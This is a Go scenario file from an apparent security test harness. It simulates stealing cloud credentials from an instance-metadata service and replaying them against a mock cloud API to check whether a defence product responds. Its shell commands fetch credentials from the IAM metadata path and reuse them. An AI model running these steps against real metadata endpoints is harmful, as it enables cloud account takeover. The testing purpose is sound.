package scenarios

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/r6security/phoenix-test-harness/internal/core"
	"github.com/r6security/phoenix-test-harness/internal/mocks"
)

func init() { core.RegisterScenario(&c3IMDSTheft{}) }

// c3IMDSTheft: a MOCK 169.254.169.254 metadata endpoint (in-ns ClusterIP) issues
// a FAKE cloud credential; the compromised pod retrieves it AND uses it
// successfully against the mock cloud API. ORACLE: the mock cloud API returns an
// authorized response to the stolen fake cred. R6 CANNOT respond: IMDS theft is
// invisible to Phoenix; a stolen cloud cred stays valid after the pod rotates.
//
// CONTAINMENT: the harness points the attacker at the IN-NAMESPACE mock IMDS, not
// the real link-local address, and the credential is FAKE.
type c3IMDSTheft struct {
	app   string
	imds  *mocks.MockIMDS
	cloud *mocks.MockCloudAPI
}

func (s *c3IMDSTheft) Metadata() core.ScenarioMeta {
	return core.ScenarioMeta{
		Name:               "c3-imds-theft",
		Category:           core.CategoryModernUnsupported,
		Source:             "Cat3 c3-imds-theft; ADA II model/cloud cred; Phoenix-AI Model Theft",
		R6ResponseTag:      core.R6CannotRespond,
		AttackTechniqueIDs: []string{"T1552.005", "T1528", "T1552.007", "T1078.004"},
		R6Justification:    "IMDS credential theft hits the cloud metadata endpoint, invisible to Phoenix (no emitter, no network actuator); a stolen cloud credential remains valid after the pod rotates (cloud-side, not a pod identity Phoenix revokes). Cannot respond. Strong differentiator.",
	}
}

func (s *c3IMDSTheft) Setup(ctx context.Context, env *core.Env) error {
	s.app = "c3imds-target"
	imds, err := mocks.DeployIMDS(ctx, env)
	if err != nil {
		return err
	}
	s.imds = imds
	cloud, err := mocks.DeployMockCloudAPI(ctx, env)
	if err != nil {
		return err
	}
	s.cloud = cloud
	_, err = deployTarget(ctx, env, s.app, "", nil)
	return err
}

func (s *c3IMDSTheft) Execute(ctx context.Context, env *core.Env) (core.AttackResult, error) {
	pod, err := runningPodByApp(ctx, env, s.app)
	if err != nil {
		return core.AttackResult{}, err
	}
	stages := []string{
		"cred-access: hit mock IMDS (169.254.169.254 stand-in) for cloud creds (T1552.005)",
		"steal: retrieve the fake cloud credential (T1528)",
		"use: present the stolen cred to the mock cloud API (T1078.004)",
	}
	// Fetch the fake credential from the mock IMDS, then store it for the oracle.
	// Retry until the fetched body is non-empty: the mock readiness gate already
	// confirmed the listener serves, but the Service endpoint can lag the pod by a
	// beat; retrying removes the residual "len=0" race so the steal is reliable.
	fetchCmd := fmt.Sprintf("for i in 1 2 3 4 5; do wget -T 3 -qO- http://%s:8081/latest/meta-data/iam/security-credentials/role 2>/dev/null > /tmp/.r6th_imds_cred; if [ -s /tmp/.r6th_imds_cred ]; then break; fi; sleep 1; done; cat /tmp/.r6th_imds_cred", s.imds.ClusterDNS)
	res := env.Exec(ctx, pod.Name, firstContainer(pod), []string{"sh", "-c", fetchCmd})
	env.Log.Logf("c3-imds-theft: fetched cred body len=%d", len(res.Stdout))
	gotCred := strings.Contains(res.Stdout, mocks.FakeIMDSCredential)
	return core.AttackResult{
		Stages:   stages,
		Commands: []string{"wget mock-imds .../security-credentials/role  # FAKE cred", "present stolen cred to mock cloud API"},
		Notes:    map[string]string{"credFetched": fmt.Sprintf("%v", gotCred)},
	}, nil
}

func (s *c3IMDSTheft) SuccessOracle(ctx context.Context, env *core.Env) (core.OracleResult, error) {
	time.Sleep(2 * time.Second)
	ev := map[string]string{}
	pod, err := runningPodByApp(ctx, env, s.app)
	if err != nil {
		// Even if the pod rotated, the stolen cloud credential remains valid — but
		// the observable use must come from somewhere; we use the replacement pod.
		ev["credUsed"] = "false"
		return core.OracleResult{Achieved: false, ObservedState: "compromised pod absent for cred replay", Evidence: ev}, nil
	}
	// Use the stolen fake credential against the mock cloud API (the oracle: an
	// authorized response). The mock authorizes only the fake IMDS credential.
	useCmd := fmt.Sprintf("CRED=$(cat /tmp/.r6th_imds_cred 2>/dev/null); for i in 1 2 3 4 5; do R=$(wget -T 3 -qO- --header=\"Authorization: $CRED\" http://%s:8082/authorize 2>/dev/null); if [ -n \"$R\" ]; then break; fi; sleep 1; done; printf '%%s' \"$R\"", s.cloud.ClusterDNS)
	res := env.Exec(ctx, pod.Name, firstContainer(pod), []string{"sh", "-c", useCmd})
	authorized := strings.Contains(res.Stdout, "\"authorized\":true")
	ev["credUsed"] = fmt.Sprintf("%v", authorized)
	ev["cloudResponse"] = strings.TrimSpace(res.Stdout)
	state := fmt.Sprintf("stolen FAKE cloud cred authorized by mock cloud API=%v", authorized)
	return core.OracleResult{Achieved: authorized, ObservedState: state, Evidence: ev}, nil
}

func (s *c3IMDSTheft) Teardown(ctx context.Context, env *core.Env) error {
	return teardownByApp(ctx, env, s.app, "mock-imds", "mock-cloud-api")
}
